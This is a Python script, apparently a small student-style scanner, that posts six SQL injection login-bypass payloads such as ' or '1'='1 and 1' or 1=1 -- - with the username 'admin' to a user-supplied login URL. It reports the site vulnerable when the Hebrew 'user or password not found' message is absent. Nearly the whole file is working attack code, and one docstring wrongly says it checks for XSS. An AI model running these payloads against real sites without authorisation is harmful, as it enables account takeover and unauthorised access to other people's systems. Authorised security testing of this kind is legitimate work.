import requests
from bs4 import BeautifulSoup


def input_values(user_name):
    """returns 6 different values of SQL injection of usernames and passwords"""
    attack_1 = {"username": user_name,
                "password": "' or '1'='1	"}
    attack_2 = {"username:": user_name,
                "password": "' or 1='1	"}
    attack_3 = {"username": user_name,
                "password": "1' or 1=1 -- -	"}
    attack_4 = {"username": "' or '1'='1	",
                "password": "' or '1'='1	"}
    attack_5 = {"username": "' or ' 1=1	",
                "password": "' or ' 1=1	"}
    attack_6 = {"username": "1' or 1=1 -- -	",
                "password": "12345678"}
    values_list = [attack_1, attack_2, attack_3, attack_4, attack_5, attack_6]
    return values_list


def check_login(url, values):
    """scans the website and returns True if xss vulnerabilities are found, False otherwise"""
    is_vulnerable = False
    for input_value in values:
        response = requests.post(url, data=input_value)  # gives the HTTP page
        bs = BeautifulSoup(response.text, "html.parser")
        messageList = bs.find_all("div", {"class": "message"})  # finds message's attributes on the pages
        web_warning_message = '<div class="message">שם המשתמש או הסיסמא לא קיימים במערכת!</div>'

        if str(messageList[0]) != (web_warning_message):
            print(f"[+] SQL INJECTION detected on {url}")
            print(f"[*] input values:")
            print(input_value)
            is_vulnerable = True

    return f"\nSQL INJECTION VULNERABILITY STATUS; {is_vulnerable}"


if __name__ == "__main__":
    try:
        print("\t-- SQL INJECTION ATTACK --\n")
        username = 'admin'  # Existing username
        url = input("Enter url address: ")
        values = input_values(username)
        print(check_login(url, values))
    except:
        print("SYSTEM MESSAGE:\n\t[X] Automatic test failed...")